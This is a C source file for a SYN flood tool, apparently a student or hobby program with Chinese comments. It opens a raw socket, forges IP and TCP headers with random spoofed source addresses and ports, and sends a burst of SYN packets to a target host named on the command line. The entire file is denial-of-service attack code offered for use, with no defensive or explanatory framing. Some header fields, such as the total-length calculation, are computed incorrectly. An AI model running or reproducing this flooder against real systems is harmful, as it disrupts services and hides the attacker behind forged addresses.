#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <errno.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/time.h>

#define PORT 114
extern int errno;

int sockfd;
struct sockaddr_in addr; 
char straddr[128]; 
char sendbuf[2048];
char recvbuf[2048];
int sendnum;
int recvnum;
int datalen = 30;

/*construct the packet and send it*/
void send_packet(int sockfd, struct sockaddr_in* addr){  
	
	
	struct ip* ip = (struct ip*)sendbuf;
	memset(sendbuf,0,sizeof(sendbuf));
	
	//设置ip头部
	ip->ip_v=4;    /*version*/
	ip->ip_hl=(sizeof(struct ip))/(sizeof(int));		/*header length*/
	ip->ip_tos=0; 		/*type of service*/
	ip->ip_len=htons(sizeof(struct ip))+sizeof(struct tcphdr);		/*total length*/
	ip->ip_p=IPPROTO_TCP;			/*protocol*/
	ip->ip_off=0;		/*fragment offset field*/
	ip->ip_ttl=128;
	
	//随即设置攻击端ip地址
	ip->ip_src.s_addr=random();    /*source address*/
	ip->ip_dst = addr->sin_addr;

	//完成tcp头部的设置
	struct tcphdr *tcp_header=(struct tcphdr*)(sendbuf+sizeof(struct ip));
    tcp_header->ack_seq = 0;
    tcp_header->doff = (sizeof(struct tcphdr)/sizeof(int));
	tcp_header->source=random();
	tcp_header->dest=htons(PORT);  
    tcp_header->res1 = 0;
    tcp_header->res2 = 0;
    tcp_header->urg = 0;
    tcp_header->ack = 0;
    tcp_header->psh = 0;
    tcp_header->rst = 0;
    tcp_header->syn = 1;
    tcp_header->fin = 0;
    tcp_header->window = htons(0x100);
    tcp_header->urg_ptr = 0;
	
	//int len=datalen+8;
	//tcp_header->check=my_cksum((unsigned short*)ip, len);
	
	int len=sizeof(struct ip)+sizeof(struct tcphdr);
	int retval = sendto(sockfd, sendbuf, len, 0, (struct sockaddr*)addr, sizeof(struct sockaddr));
    if(retval == -1)
	{
        perror("sendto()");
        exit(-1);
    }
	else{
		printf("%s    %d	", inet_ntoa(addr->sin_addr),PORT);
		printf("%s    %d	\n", inet_ntoa(ip->ip_src),tcp_header->source);
	}
	 
	
}
int main(int argc,char ** argv){
	
	if(argc !=2){
		printf("Please input the correct format:syn_flooding ip\n");
		exit(-1);
	}
	sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);  //socket创建
	if(sockfd==-1){
		perror("socket()");
		return -1;
	}
	//初始化套接字
	memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
	int retval = inet_pton(AF_INET, argv[1], &addr.sin_addr); 
	
    if(retval == -1 || retval == 0) {
        struct hostent* host = gethostbyname(argv[1]);
        if(host == NULL) 
		{
            fprintf(stderr, "gethostbyname(%s):%s\n", argv[1], strerror(errno));
            exit(-1);
        }
		if(host->h_addr_list != NULL && *(host->h_addr_list) != NULL)
		{
             strncpy((char*)&addr.sin_addr, *(host->h_addr_list), 4);
             inet_ntop(AF_INET, *(host->h_addr_list), straddr, sizeof(straddr));
        }
             printf("syn flooding address:%s(%s)\n\n", host->h_name, straddr);
    }else 
	{
        strcpy(straddr, argv[1]);
        printf("syn flooding address:%s(%s)\n\n", straddr, straddr);
    }
	
	
	/*set the socket*/
	int on = 1;
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
	{ 	
		fprintf(stderr, "setsockopt IP_HDRINCL ERROR! \n");	
		exit(1);
	}
	
	int i;
	for(i=0;i<1000;i++){
		send_packet(sockfd,&addr);
	}
	
	
	return 0;
}